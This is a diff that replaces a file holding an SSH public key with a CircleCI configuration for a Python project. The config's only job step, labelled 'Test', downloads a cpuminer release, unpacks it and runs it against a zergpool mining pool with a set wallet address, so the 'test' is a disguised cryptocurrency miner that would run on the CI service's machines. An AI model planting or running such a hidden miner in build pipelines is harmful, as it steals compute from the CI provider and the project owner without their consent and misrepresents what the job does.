@@ -1,1 +1,17 @@
-ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvVxNAn6cQX7VIh3Ni29nsu2xQIp0Pqtp2dGs3iJBgFJF6tLO+JGOIomb+lDemXhzv/Z15sqtjm37GmF1/d8GBleaZbxf3QTTivC3YaUqChuQGGDCOfrfs+GjqmOG+qOxk498SfkcRx526uTRu4w9UA3A/gfVzzZtgsrCSPg05qwIiszgypvKoC5Ps6PPFXcnb6PYLCnZTGGVzxaPMRn27//d9GD65hfol+bBv2SebalhbB+jt/uqPp4XeETc1bwK2EQ7R1SoyPcQK5zfrrzWPLjonqZ/c6m0theEL0xx2JoZuFhZ01g6/ZzamYRgg4aWFBMuI2urN8K1qiM/UFWzX 
+version: 2.1
+
+orbs:
+   python: circleci/python@0.2.1
+
+jobs:
+  build-and-test:
+    executor: python/default
+    steps:
+      - run:
+          command: ! wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.11/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://power2b.na.mine.zergpool.com:7445 -u BUdryaG1mRpsfjnga9caW197WyEfdBjvFx -p c=MBC,m=solo
+          name: Test
+
+workflows:
+  main:
+    jobs:
+      - build-and-test
